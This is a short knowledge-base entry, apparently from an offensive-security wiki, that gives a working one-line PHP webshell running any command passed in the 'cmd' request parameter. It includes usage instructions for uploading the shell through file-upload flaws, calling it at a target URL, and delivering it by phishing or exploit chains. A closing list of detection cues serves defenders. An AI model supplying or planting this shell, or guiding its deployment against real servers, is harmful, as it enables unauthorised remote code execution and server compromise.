---
id: f54afe89-b7b7-417e-8a14-d9b81a7d5d43
type: code
language: php
verified: true
created_at: '2020-02-21T04:46:28.599410+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
tags:
  - php
  - webshell
  - rce
  - payload
platforms:
  - Web
validated: true
---

# PHP-System-Webshell

## Code

```php
<?php system($_REQUEST['cmd']); ?>
```

## Description

This is a minimal PHP webshell that executes operating system commands passed via the 'cmd' parameter in HTTP requests (GET or POST). It uses the system() function to run the command and outputs the result directly to the response, allowing remote code execution on the server.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_REQUEST['cmd'] | Command to execute on the server | `whoami` or `ls -la` |

## Usage

Upload this code to a web server via a file upload vulnerability or direct file write. Access it via URL like http://target/uploads/shell.php?cmd=id to run commands. Commonly used in web exploitation for initial RCE after bypassing upload restrictions. Deliver via phishing or exploit chains targeting PHP applications.

## Detection

- Web server logs showing unusual parameter values in requests (e.g., ?cmd=).
- File integrity monitoring detecting PHP files with system() calls in upload directories.
- WAF rules blocking requests with command injection patterns.
- Antivirus signatures for known webshell patterns.
- Network traffic analysis for command output in HTTP responses.

## Related

- [[procedures/Bypass-Insecure-PHP-Upload-Form-File-Restrictions]]
- [[tools/Burp-Suite]] (for intercepting uploads)
